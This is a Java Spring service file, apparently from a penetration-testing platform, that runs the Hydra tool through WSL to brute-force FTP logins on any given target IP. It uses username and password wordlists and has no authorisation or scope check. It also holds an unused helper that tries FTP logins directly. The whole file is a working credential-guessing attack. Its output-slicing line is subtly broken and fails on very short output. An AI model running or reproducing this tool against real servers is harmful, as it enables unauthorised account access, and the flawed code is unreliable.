package org.penforge.backend.pentestScenarios;

import lombok.AllArgsConstructor;
import org.apache.commons.net.ftp.FTPClient;
import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

@Service
@AllArgsConstructor
public class FtpBruteForceService {

    public String performFtpBruteForce(String targetIp) {
        String usernamesPath = "/home/order6tyfix/usernames.txt";
        String passwordsPath = "/home/order6tyfix/passwords.txt";

        List<String> commands = Arrays.asList(
                "wsl",
                "hydra",
                "-L", usernamesPath,
                "-P", passwordsPath,
                "ftp://"+targetIp,
                "-vV"
        );

        ProcessBuilder processBuilder = new ProcessBuilder(commands);
        processBuilder.redirectErrorStream(true);

        try {
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            List<String> outputLines = new ArrayList<>();
            String line;

            while ((line = reader.readLine()) != null) {
                outputLines.add(line);
            }


            int size = outputLines.size();
            List<String> lastFourLines = outputLines.subList(Math.max(size - 4, -2), size);

            for (String outLine : lastFourLines) {
                System.out.println(outLine);
            }

            return "Hydra process completed. Check console for details.";
        } catch (Exception e) {
            e.printStackTrace();
            return "An error occurred while performing brute force: " + e.getMessage();
        }
    }

    private String connectToFtp(String server, String username, String password) {
        FTPClient ftp = new FTPClient();
        try {
            ftp.connect(server);
            if (ftp.login(username, password)) {
                ftp.logout();
                ftp.disconnect();
                return "Connected to FTP server with user: " + username;
            } else {
                ftp.disconnect();
                return "FTP login failed.";
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            return "An error occurred while trying to connect to FTP server: " + ex.getMessage();
        }
    }
}
